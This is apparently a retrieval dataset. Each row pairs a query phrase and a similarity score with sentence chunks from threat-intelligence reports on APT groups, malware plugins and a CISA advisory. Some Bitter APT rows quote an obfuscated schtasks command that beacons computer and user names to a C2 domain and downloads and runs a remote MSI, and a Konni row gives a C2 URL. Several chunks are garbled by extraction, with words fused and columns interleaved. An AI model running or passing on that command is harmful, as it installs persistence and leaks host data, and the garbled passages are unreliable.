activity from Tor|0.7948621486308584|['Wecombinethesetwometricstoformanoverallthreat 1 Introduction ranking that we call the Targeted Threat Index (TTI).', 'Whileotherscoringsystemsexistforcharacterizingthe Civil society organizations (CSOs), working on hu- level of severity and danger of a technical vulnerabil- man rights issues around the globe, face a spectrum ity[7,17,41,50], nocommonsystemexistsforranking ofpolitically-motivatedinformationsecuritythreatsthat thesophisticationoftargetede-mailattacks.', 'TTIallows seektodeny(e.g.', 'Internetfiltering,denial-of-serviceat- us to gain insights into the relative sophistication of so- tacks), manipulate (e.g.', 'website defacements) or moni- cialengineeringandmalwareleveragedagainstCSOs.', 'tor (e.g.', 'targeted malware) information related to their Akeytothesuccessofourstudyisauniquemethod- work.', 'Targeted malware attacks in particular are an in- ology, combining qualitative and technical analysis of USENIX Association 23rd USENIX Security Symposium 527e-mails and their attachments with fieldwork (e.g.', 'site in Section 4.', 'Training and outreach implications of our visits)andinterviewswithaffectedCSOs.', 'Thismethod- workarediscussedinSection5.Wepresentrelatedwork ology,whichwedescribeinmoredetailinSection3,al- inSection6andconcludeinSection7.']
activity from Tor|0.7948621486308584|"['Scottsboro City Board of The Payroll Department of the Account Hijacking P Education Cyber US Link Education Scottsboro City Board of Crime Education falls victim of a phishing scam.', 'The attackers requested W-2 information from all employees.', '01/03/2018 ?', ""Rockdale Independent School An email phishing scheme causes Account Hijacking P Education Cyber US Link District several Rockdale ISD employees' Crime taxes to be falsely filed and compromises confidential tax information for all employees."", '01/03/2018 ?', 'b-tor[.', ']ru Users Researchers from Palo Alto Malware/PoS Malware X Individual Cyber RU Link Networks discover a Russian Crime BitTorrent Site distributing a Monero Miner.', '01/03/2018 ?', 'Colorado Department of For the second time in two weeks, Malware/PoS Malware O Public Cyber US Link Transportation (CDOT) the computers at the Colorado administration, Crime Department of Transportation defence, Agency shut down 2,000 compulsory computers after a ransomware social security infection.', '01/03/2018 ?', 'Primary Health Care Primary Health Care notifies Account Hijacking Q Human health Cyber US Link patients after discovering hack of and social work Crime employee email accounts.']"
“The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.|0.9642019524929888|['Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack.CISA has observed Chinese MSS-affiliated actors using theCredential Access[TA0006] techniques highlighted in table 8.Table 8: Credential access techniques observed by CISAMITRE IDNameObservationT1003.001Operating System (OS) Credential Dumping: Local Security Authority Subsystem Service (LSASS) MemoryCISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.', 'The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.T1110.004Brute Force: Credential StuffingCISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server.DiscoveryAs with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerablethere are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.', 'CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.', 'CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery[TA0007]).Table 9: Discovery technique observed by CISAMITRE IDNameObservationT1046Network Service ScanningCISA has observed suspicious network scanning activity for various ports at Federal Government entities.CollectionWithin weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using theCollection[TA0009] technique listed in table 10.Table 10: Collection technique observed by CISAMITRE IDNameObservationT1114Email CollectionCISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments.Command and ControlCISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.', 'These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.', 'For example, The Onion Router (Tor) is often used by cyber threat actors for anonymity and C2.', 'Actors carefully choose proxy tools depending on their intended use.', 'These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits.CISA has observed Chinese MSS-affiliated actors using theCommand and Control[TA0011] techniques listed in table 11.Table 11: Command and control techniques observed by CISAMITRE IDNameObservationT1090.002Proxy: External ProxyCISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.T1090.003Proxy: Multi-hop ProxyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.T1573.002Encrypted Channel: Asymmetric CryptographyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.', 'When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information.CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.', 'See table 12 for patch information on the CVEs mentioned in this report.', 'For more information on vulnerabilities routinely exploited by sophisticated cyber actors, seeCISA Alert: Top 10 Routinely Exploited Vulnerabilities.Table 12: Patch Information for Vulnerabilities Routinely Exploited by MSS-affiliated Cyber ActorsVulnerabilityVulnerable ProductsPatch InformationCVE-2020-5902Big-IP devices (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO, CGNAT)CVE-2019-19781CVE-2019-11510Pulse Connect Secure 9.0R1 - 9.0R3.3, 8.3R1 - 8.3R7, 8.2R1 - 8.2R12, 8.1R1 - 8.1R15Pulse Policy Secure 9.0R1 - 9.0R3.1, 5.4R1 - 5.4R7, 5.3R1 - 5.3R12, 5.2R1 - 5.2R12, 5.1R1 - 5.1R15CVE-2020-0688CISA and the FBI also recommend that organizations routinely audit their configuration and patch management programs to ensure they can track and mitigate emerging threats.']
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.|1.0|['While this sort of activity is not a direct result of the exploitation of emergent vulnerabilities, it demonstrates that cyber threat actors can effectively use available open-source information to accomplish their goals.', 'Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack.CISA has observed Chinese MSS-affiliated actors using theCredential Access[TA0006] techniques highlighted in table 8.Table 8: Credential access techniques observed by CISAMITRE IDNameObservationT1003.001Operating System (OS) Credential Dumping: Local Security Authority Subsystem Service (LSASS) MemoryCISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.', 'The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.T1110.004Brute Force: Credential StuffingCISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server.DiscoveryAs with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerablethere are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.', 'CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.', 'CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery[TA0007]).Table 9: Discovery technique observed by CISAMITRE IDNameObservationT1046Network Service ScanningCISA has observed suspicious network scanning activity for various ports at Federal Government entities.CollectionWithin weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using theCollection[TA0009] technique listed in table 10.Table 10: Collection technique observed by CISAMITRE IDNameObservationT1114Email CollectionCISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments.Command and ControlCISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.', 'These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.', 'For example, The Onion Router (Tor) is often used by cyber threat actors for anonymity and C2.', 'Actors carefully choose proxy tools depending on their intended use.', 'These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits.CISA has observed Chinese MSS-affiliated actors using theCommand and Control[TA0011] techniques listed in table 11.Table 11: Command and control techniques observed by CISAMITRE IDNameObservationT1090.002Proxy: External ProxyCISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.T1090.003Proxy: Multi-hop ProxyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.T1573.002Encrypted Channel: Asymmetric CryptographyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.', 'When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information.CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.', 'See table 12 for patch information on the CVEs mentioned in this report.']
brute-force passwords.|0.8324675081655724|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
or delete files|0.9063572151819645|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.|1.0000000000000002|['For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.', 'We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering.', 'Analysis of Phishing Lures and Payloads We identified seven emails pretending to be from the Embassy of Kyrgyzstan, being sent to recipients in the nuclear energy industry in China.', 'In some emails, people and entities in academia are also targeted, also related to nuclear energy.', 'The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.', 'The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.', 'This activity appears to be a continuation of the tactics and campaign that Bitter APT have been using since at least 2021.', '1/6Figure 1: Attack flow described in this research Social Engineering with Phishing Emails The emails contain a number of social engineering techniques.', 'The name and email address used to send the phishing emails is crafted to look like it is coming from an Embassy in Beijing.', 'A free email provider is used, therefore domain reputation checks will not be useful.', 'Figure 2: Name crafted to appear as communication from an embassy The email is signed off with the name and details of an actual attach of the Kyrgyz embassy in China.']
Scheduled task|0.761127730336828|"['The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as follows: 1.', 'The MagicString class provides a getter property, which decrypts strings on access.', '2.', 'The MagicString class has an encrypted string field.', '3.', 'The MagicString class provides __Decrypt, a wrapper method for decryption.', '4.', 'If it is StealthMutants first time to use the __Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) will be initialized based on the hard-coded __factory value, although this IV is meaningless in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
Scheduled task|0.7722605317298843|['Tactic ID Name Description Initial ScarCruft uses watering-hole attacks to T1189 Drive-by Compromise Access compromise victims.', 'Execution Command and Scripting Interpreter: T1059.006 The Dolphin loader a uses Python script.', 'Python 7/8Tactic ID Name Description Command and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.007 JavaScript watering-hole attack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T1106 Native API files and inject processes.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.005 Task start after installation.', 'Persistence Boot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.001 Registry Run Keys / Startup Folder loader.', 'Process Injection: Portable Defense T1055.002 Dolphin can inject into other processes.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.']
Scheduled task|0.7576326530439104|['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the following: 1.', 'On launch, the primary NoxPlayer executable Nox.exe will send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the appropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have been replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is installed on the victims machine.']
Scheduled task|1.0|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
Scheduled task|0.7968242203144852|['Pgina 7 de 11RESEARCH_ Docless Vietnam APT -A technique still alive- The code contains Bai.doc in base64, which is the decoy document.', 'And uses scheduled tasks to persist, checking if the victim has privileges.', 'This file checks if the user is administrator.', 'If so, it copies the DLL file in WINDIR\\\\debug\\\\ and %TEMP% otherwise.', 'If administrator, it will create a scheduled task with SYSTEM privileges, if not, it will try without so high privileges Aside, this file is in charge of persistence.', 'It creates a scheduled task.', 'It is quite interesting that the malware checks if Kaspersky (avp.exe process) is running in the system and acts differently if so.', 'If Kaspersky IS in the system, it will create a scheduled task that runs a vbs script, as usual.', 'But if Kaspersky is NOT present in the system, it will rename the vbs to TXT and run wbscript with the parameter /E:vbscript that allows the program to know what kind of script it is running.', 'We guess this is trying to bypass the detection tin some way, although it sounds counterintuitive.', 'The final stage, uninstalling yourself The system runs the DLL with InstallUtil.exe, to avoid Smartscreen and Applocker.']
Scheduled task|0.8623517592767699|"['Analyze The recipients of the document 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Official Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts application (CVE-201711882) to decode the 8.t in memory, after fork to install two files: C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f and C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da The malware is a dll, it seems to be Gh0st RAT.', 'https://app.any.run/tasks/5715cfe3-2550-4808-aad0-1ea4c4fc7a88 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe call in the entry loads dynamically wsc.dll and call the function _run@4 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 1/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to connect to nicetiss54.lflink.com|185.216.35.11.', 'https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 2/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Intelligence Consideration We have the same TTps and victimology like Goblin Panda: Officials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdoor has changed.', 'Its used a scheduled task.', 'Usually this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha256 41f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccf sha1 6e670a837970a1fb4161d77d5f720d318d7e4dbc md5 f34514118eb4689560cd6c0c654f26d9 Dropped executable file sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc.dll 4e88f8a3c3be45e0a59a8868f2b2ace51754fcdbfa9ab618e3d9d0e17831990f sha256 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\wsc_proxy.exe 1948bb0df11f768d6dd30ae7ecec5550db7c817d09cb31b5e2cee9b86a4047da https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 3/45/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetiss54.lflink.com Connections ip 185.216.35.11 https://medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906 4/4']"
create a scheduled task|0.8412866281638809|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
These payloads are compressed inside RAR files, this helps avoid static analysis techniques|0.8566966305455775|['If the recipient were to use a search engine to check for this employee, they would easily be able to find corroborating information from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan, adding to the supposed legitimacy of the email.', 'This is presumably also how the malicious actor was able to get information in order to craft the lure.', 'The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines.', 'Figure 3: Email body lure with nuclear themes Malicious Payloads via CHM and Microsoft Excel Files Multiple payloads have been observed being delivered.', 'Either CHM files, or Microsoft Excel files with Equation Editor exploits.', 'These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first.', 'The purpose of the payloads are to create persistence and download further malware payloads.', 'We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s.', 'Malicious Microsoft Excel Files The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks.', 'There is no decoy in the document.', 'One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.']
The computer name|0.9943833426080062|[]
The computer name|0.7772815810328116|['dedicated USB boot device.', 'Pop!_OS: This is my primary Today, I keep my multi-boot with me operating system.', 'Having a bootable at all times.', 'Often, I forget that booting live version allows me to repair or is the main purpose since I also use it restore the system.', 'I can also quickly to transfer large files.', 'The best-case install the OS to any other computer.', 'scenario is that you will never need it.', 'Tails: This bootable OS (tails.boum.', 'If you do, you will be glad you made org) allows me to launch an entire these efforts.', 'OS which is protected by the Tor network.', 'It is beneficial for sensitive investigations which must possess a private connection and leave no trace behind.']
The computer name|0.7556849713361665|['Out of the created files, all files are obfuscated except for the legitimate doc file.Lomd02.png (Malicious jse script)Operator.jse (Malicious jse script)WindowsHotfixUpdate.jse (Malicious jse script)20231126_9680259278.doc (Legitimate doc file)WindowsHotfixUpdate.ps1 (Malicious PowerShell script)A legitimate document file, 20231126_9680259278.doc, is included among the created files.', 'The threat actor has probably included this to deceive the user into thinking that they opened a legitimate file.Operator.jse creates a Task Scheduler entry that executes WindowsHotfixUpdate.jse, which in turn executes the file WindowsHotfixUpdate.ps1.', 'The file WindowsHotfixUpdate.ps1 receives commands from the C2, and it is presumed that these commands are obfuscated, because the jse file with the file name Lomd02.png was observed deobfuscating such commands and loading them in xml format.While additional commands could not be examined due to the C2 being unavailable for access at the moment, it seems that various additional attacks would be possible depending on the commands sent from the C2.Task Scheduler name: WindowsHotfixUpdate[B409302303-02940492024]Trigger: Repeat every minute indefinitelyAction: Execute C:\\\\ProgramData\\\\WindowsHotfixUpdate.jseBecause the bait file is also run, ordinary users cannot recognize that their systems are infected by malware.', 'Since such malware are aimed at specific targets, users should refrain from running attachments in emails sent from unknown sources.', '[File Detection]Backdoor/JS.Konni (2023.12.06.03)Backdoor/Win.Konni (2023.12.06.03)Backdoor/PowerShell.Konni (2023.12.06.03)MD5682b5a3c93e107511fdd2cdb8e50389a78ea811850e01544ca961f181030b584a93474c3978609c8480b34299bf482b7b58eb8a3797d3a52aba30d91d207b688d06d1c2ec1490710133dea445f33bd19URLhttp[:]//gjdow[.]atwebpages[.]com/dn[.', ']php?name=[Computer']
the computer name is sent to the C2|0.8186639699847433|"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.', 'The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\\\Windows\\\\System32\\\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.', 'Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.']"
the username is also sent to the C2.|0.8443909796366365|"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.', 'The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\\\Windows\\\\System32\\\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.', 'Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.']"
The computer name and the username is also sent to the C2.|1.0|"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.', 'The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\\\Windows\\\\System32\\\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i htt^p:/^/mirz^adih^atti^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.', 'Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.']"
remote access tool|0.787289445950889|['Create rules to identify impossible logon scenarios such as geographic anomalies.', 'Regularly audit MFA enrollment to ensure comprehensive implementation and identify gaps in logging.', 'This thorough approach is critical for detecting and alerting on outliers and unusual usage, not just failed logins.', 'Set up alerts for repeated authentication failures or unanswered attempts, which could indicate an attackers efforts to overwhelm or misdirect authentication requests.', 'Remote Access.', 'Given the risks associated with RDP abuse, its crucial to restrict and closely monitor remote access.', 'Assess and minimize the list of authorized remote management tools.', 'Unauthorized tools should be blocked and monitored for, increasing the chances of detecting attacker activity.', 'Clearly define and enforce which remote management tools are approved for business use.', 'Privilege Escalation.', 'While it may be challenging for larger organizations to track all privilege changes, focusing on high-privilege accounts is essential.']
file stealer|1.0|['We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations.', 'We assess with low confidence that MoustachedBouncer is closely cooperating with Winter Vivern, another group targeting European diplomats but using different TTPs.', 'Since 2014, the group has been operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C communications.', 'Starting in 2020, the group has been using, in parallel, a second malware framework we have named Disco.', 'Both NightClub and Disco support additional spying plugins including a screenshotter, an audio recorder, and a file stealer.', 'Victimology According to ESET telemetry, the group targets foreign embassies in Belarus, and we have identified four different countries whose embassy staff have been targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20Figure 1.', 'Timeline of MoustachedBouncer activities Attribution While we track MoustachedBouncer as a separate group, we have found elements that make us assess with low confidence that they are closely collaborating with another group known as Winter Vivern.', 'The latter was discovered in 2021 and is still active as of 2023.']
file stealer|1.0|"['It is important to note that the plugins dont have unique internal identification numbers; therefore we are identifying them here by their DLL names on disk, which we have never seen change.', 'Table 2.', 'List of plugin DLL files Plugin DLL name Overview Keylogger.', 'Kstrcs.dll It only actively logs keystrokes when the foreground window belongs to a process named QQ.exe and the window title matches QQEdit.', ""It's likely target is the Tencent QQ chat application."", 'File stealer.', 'Has a configuration file that enables the collection of files from different sources: HDDs, sebasek.dll USB thumb drives, and CD-ROMs; as well as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be between a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dll key.', 'pRsm.dll Captures input and output audio streams.', 'Credential stealer.', 'mailLFPassword.dll Steals credentials from Outlook and Foxmail email client software.']"
